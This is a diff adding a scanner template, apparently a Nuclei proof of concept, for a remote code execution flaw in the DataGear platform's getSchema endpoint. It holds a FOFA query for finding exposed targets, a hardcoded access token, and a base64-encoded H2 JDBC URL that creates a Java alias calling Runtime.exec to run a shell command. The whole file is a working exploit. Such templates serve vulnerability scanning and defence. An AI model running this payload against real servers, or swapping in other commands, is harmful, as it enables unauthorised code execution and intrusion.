@@ -1,0 +1,19 @@
+id: poc-ehv6dm25knykr50n
+info:
+  name: DataGear平台 getSchema存在远程代码执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ehv6dm25knykr50n'
+  tags: rce,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ehv6dm25knykr50n
+    fofa: body="changeThemeData?theme=" || body="DataGear"
+http:
+- raw:
+  - "POST /de2api/datasource/getSchema HTTP/1.1\nX-DE-TOKEN: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEsIm9pZCI6MX0.a5QYOfZDYlhAy-zUMYzKBBvCUs1ogZhjwKV5SBTECt8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,\nlike Gecko) Chrome/91.0.4472.77 Safari/537.36\nContent-Type: application/json\nConnection: close\n\n{\n  \"id\": \"\",\n  \"name\": \"11\",\n  \"description\": \"\",\n  \"type\": \"h2\",\n  \"apiConfiguration\": [],\n  \"paramsConfiguration\": [],\n  \"enableDataFill\": false,\n  \"configuration\": \"eyJkYXRhQmFzZSI6IiIsImpkYmMiOiJqZGJjOmgyOm1lbTp0ZXN0O2luXFxpdD1EUk9QIEFMSUFTIElGIEVYSVNUUyBFWEVDXFw7Q1JFQVRcXEUgQUxJQVMgRVhFQyBBUyAkJHZvaWQgZXhlYygpIHRocm93cyBFeGNlcHRpb24ge2phdmEubGFuZy5TdHJpbmcgcyA9IG5ldyBqYXZhLnV0aWwuU2Nhbm5lcihqYXZhLmxhbmcuUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhcImVjaG8gdGVzdDEyM1wiKS5nZXRJbnB1dFN0cmVhbSgpKS51c2VEZWxpbWl0ZXIoXCJcXEFcIikubmV4dCgpXFw7dGhyb3cgbmV3IGphdmEubGFuZy5FeGNlcHRpb24ocylcXDt9JCRcXDtDQUxMIEVYRUMoKVxcOyIsInVybFR5cGUiOiJqZGJjVXJsIiwic3NoVHlwZSI6InBhc3N3b3JkIiwiZXh0cmFQYXJhbXMiOiIiLCJ1c2VybmFtZSI6IjEyMyIsIiBwYXNzd29yZCI6IjEyMyIsImhvc3QiOiIiLCJhdXRoTWV0aG9kIjoiIiwicG9ydCI6MCwiaW5pdGlhbFBvb2xTaXplIjo1LCJtaW5Qb29sU2l6ZSI6NSwibWF4UG9vbFNpemUiOjUsInF1ZXJ5VGltZW91dCI6MzB9Cg==\"\n}"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
